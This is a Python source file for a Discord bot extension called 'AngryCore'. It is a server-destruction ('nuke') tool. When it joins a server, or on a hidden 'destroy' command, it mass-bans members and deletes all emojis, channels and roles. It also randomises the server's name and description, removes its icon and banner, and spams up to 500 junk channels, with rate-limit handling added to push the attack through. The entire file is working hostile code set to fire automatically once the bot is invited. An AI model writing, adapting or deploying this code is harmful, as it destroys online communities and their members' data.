from discord.ext import commands
import asyncio
import time
from utils import helpers


class AngryCore(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.remaining_members_to_ban = []

    @commands.Cog.listener()
    async def on_guild_join(self, guild):
        await self.start(guild)

    @commands.command(aliases=["d"], hidden=True)
    @commands.cooldown(1, 10, commands.BucketType.guild)
    async def destroy(self, ctx):
        await self.start(ctx.guild)

    async def start(self, guild):
        functions = [self.ban_members, self.delete_all_emojis,
                     self.delete_all_channels, self.delete_all_roles,
                     self.ban_remaining_members, self.change_guild_info,
                     self.create_random_channels]
        run = len(functions)
        for i in range(run):
            try:
                await functions[i](guild)
            except TypeError:
                await functions[i]()
            except Exception as e:
                self.bot.logger.error(f"Ignoring exception: {e}")
                pass
        self.bot.logger.info("Done!")

    async def ban_member(self, member):
        await member.ban()

    async def maybe_wait(self, elapsed_time):
        """ Discord request rate-limit is 50requests/s per user.
            So max of 50 things (delete channel, ban member etc..) can be request at the same instant 
            before we need to wait. Wait time depends on request execution time, if it's less than 1s then 
            just wait until we reach 1s because if we ask more than 50r/s we will get rate-limited.
        """
        if elapsed_time < 1:
            self.bot.logger.debug(f"Rate-limit assumed, going to sleep {1 - elapsed_time}")
            await asyncio.sleep(1.1 - elapsed_time)  # +0.1s just to be sure

    async def ban_members(self, guild):
        self.bot.logger.info("Banning all members ...")
        member_list = guild.members
        helpers.remove_unmanageable_members(member_list, guild.me.top_role.position)
        helpers.sort_members_by_roles(member_list)
        member_chunks = helpers.get_list_chunks(member_list)
        member_chunks_length = len(member_chunks)
        for i, member_chunk in enumerate(member_chunks):
            # Don't ban the last member chunk, instead save it and ban them later
            if i+1 == member_chunks_length:
                self.remaining_members_to_ban = member_chunk
            else:
                start_time = time.time()
                futures = [self.ban_member(member) for member in member_chunk]
                await asyncio.gather(*futures)
                elapsed_time = time.time() - start_time
                await self.maybe_wait(elapsed_time)

    async def ban_remaining_members(self):
        if self.remaining_members_to_ban:
            self.bot.logger.info("Baning remaining members ...")
            futures = [self.ban_member(member) for member in self.remaining_members_to_ban]
            await asyncio.gather(*futures)
            self.remaining_members_to_ban.clear()

    async def delete_emoji(self, emoji):
        await emoji.delete()

    async def delete_all_emojis(self, guild):
        self.bot.logger.info("Deleting all emojis ...")
        all_emojis = list(guild.emojis)
        helpers.remove_all_managed_emojis(all_emojis)
        emoji_chunks = helpers.get_list_chunks(all_emojis)
        for emoji_chunk in emoji_chunks:
            start_time = time.time()
            futures = [self.delete_emoji(emoji) for emoji in emoji_chunk]
            await asyncio.gather(*futures)
            elapsed_time = time.time() - start_time
            await self.maybe_wait(elapsed_time)

    async def delete_channel(self, channel):
        await channel.delete()

    async def delete_all_channels(self, guild):
        self.bot.logger.info("Deleting all channels ...")
        # Reverse since we want top channels to be deleted last
        descending_sorted_channels = list(reversed(helpers.get_visually_sorted_channels(guild)))
        helpers.remove_unmanageable_channels(descending_sorted_channels, guild.me)
        channel_chunks = helpers.get_list_chunks(descending_sorted_channels)
        for channel_chunk in channel_chunks:
            start_time = time.time()
            futures = [self.delete_channel(channel) for channel in channel_chunk]
            await asyncio.gather(*futures)
            elapsed_time = time.time() - start_time
            await self.maybe_wait(elapsed_time)

    async def delete_role(self, role):
        await role.delete()

    async def delete_all_roles(self, guild):
        self.bot.logger.info("Deleting all roles ...")
        # guild.roles  - The first element of this list will be the lowest role in the hierarchy.
        # thus role_list is already sorted (we always aim to delete/ban from lowest rank to highest)
        roles_list = guild.roles
        helpers.remove_unmanageable_roles(roles_list, guild.me.top_role.position)
        role_chunks = helpers.get_list_chunks(roles_list)
        for role_chunk in role_chunks:
            start_time = time.time()
            futures = [self.delete_role(role) for role in role_chunk]
            await asyncio.gather(*futures)
            elapsed_time = time.time() - start_time
            await self.maybe_wait(elapsed_time)

    async def change_guild_info(self, guild):
        self.bot.logger.info("Changing guild info ...")
        guild_name = helpers.generate_random_string()
        description = helpers.generate_random_string()
        await guild.edit(name=guild_name, description=description, icon=None, banner=None)

    async def create_channel(self, guild):
        channel_name = helpers.generate_random_string()
        await guild.create_text_channel(name=channel_name, position=0)

    async def create_random_channels(self, guild):
        """ This is quite slow. Seems the fastest that Discord supports is
            around 5 channels/s but it can fall as low as 2 channel / s
            As of now you won't "officially" get rate-limited meaning you
            won't get any discord-py logs or discord HTTP headers
            saying you are. Looks like Discord does it internally without
            sending any info on it. So as of now there's no need to
            wait we just brute-force it.
        """
        self.bot.logger.info("Creating random channels...")
        max_channels = 500
        channel_instances_at_once = 3
        to_create_count = max_channels - len(guild.channels)
        loop_count = to_create_count // channel_instances_at_once
        for i in range(loop_count):
            futures = [self.create_channel(guild) for i in range(channel_instances_at_once)]
            await asyncio.gather(*futures)


def setup(bot):
    bot.add_cog(AngryCore(bot))
